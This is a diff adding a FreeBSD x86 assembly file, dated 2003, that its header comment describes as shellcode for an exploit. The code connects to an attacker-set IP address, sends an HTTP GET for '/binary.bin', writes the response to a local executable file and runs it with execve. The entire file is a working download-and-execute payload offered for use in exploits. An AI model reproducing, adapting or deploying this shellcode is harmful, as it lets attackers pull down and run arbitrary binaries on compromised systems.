@@ -1,0 +1,146 @@
+BITS 32
+
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;
+; FreeBSD assembly code that can download and execute a file 
+; from any web server. Ones converted to shellcode, the exploit 
+; must set the IP address. Also, if the file name is changed, the
+; offset must be.
+;
+; $Author: nielsh $ $Date: 2003/09/25 14:17:39 $ $Revision: 1.7 $
+
+bytes 		equ  120;
+
+;;;;;;;;;;;;;;;;;;;;;;;;
+; Connect shellcode
+
+xor		eax,eax
+push eax
+push byte       0x01
+push byte       0x02
+push            eax
+mov             al,97
+int             0x80
+mov             edx,eax
+push            0x0300000a  ; Address must be set by exploit
+mov		al,0x50
+sal		eax,24
+mov		ax,0x02AA
+push            eax
+mov             eax,esp
+
+push byte       0x10
+push            eax     
+push            edx     
+xor             eax,eax
+mov             al,98
+push            eax
+int             0x80
+
+jmp short  binary
+write:
+pop		esi
+
+;;;;;;;;;;;;;;;;;;;;;;;;
+; Write the GET command
+
+push byte       26       ; 10 for filename	
+push		esi
+push 		edx
+mov             al,4
+push		eax
+int 		0x80
+
+;;;;;;;;;;;;;;;;;;;;;;;
+; Open the local file
+
+
+xor             eax,eax
+push            eax
+push            0x6464642e
+mov             ebx,esp
+push word       755q
+push word       1537 ; O_TRUNC | O_EXCL | O_CREATE
+push            ebx
+mov             al,5
+push            eax
+int             0x80
+mov 		ebx,eax
+
+;;;;;;;;;;;;;;;;;;;;;;
+; Read the data
+
+readbyte:
+xor 		eax,eax
+push byte	1	
+push		edi
+push 		edx		
+push		eax
+mov		al,3
+int		0x80
+
+mov byte	cl, [edi]
+cmp	        cl,0x0d
+jne             short readbyte
+
+xor             eax,eax
+push byte       3
+push           	edi 
+push            edx
+push            eax
+mov             al,3
+int             0x80
+
+mov word        cx, [edi]
+cmp             cx,0x0d0a
+jne             short readbyte
+
+write_stuff:
+;;;;;;;;;;;;;;;;;;;;;;
+; Write the data
+
+read_all:
+xor             eax,eax
+push byte      	bytes	
+push            edi
+push            edx
+push            eax
+mov             al,3   
+int             0x80
+
+push		eax
+xor             eax,eax
+push            edi
+push		ebx
+push            eax
+mov             al,4
+int             0x80
+
+test		al,bytes
+jnz 		read_all
+
+;;;;;;;;;;;;;;;;;;;;;
+; Execute the file
+
+
+xor             eax,eax
+push	        ebx
+push	        ebx
+mov             al, 6
+int             0x80
+
+push            eax     
+push            0x6464642e 
+mov             ebx, esp
+push            eax 
+push            eax 
+push            ebx
+push            eax 
+mov             al,  59 
+int             0x80
+
+binary:
+call write
+
+db 'GET /binary.bin HTTP/1.0',0x0a,0x0a;
+
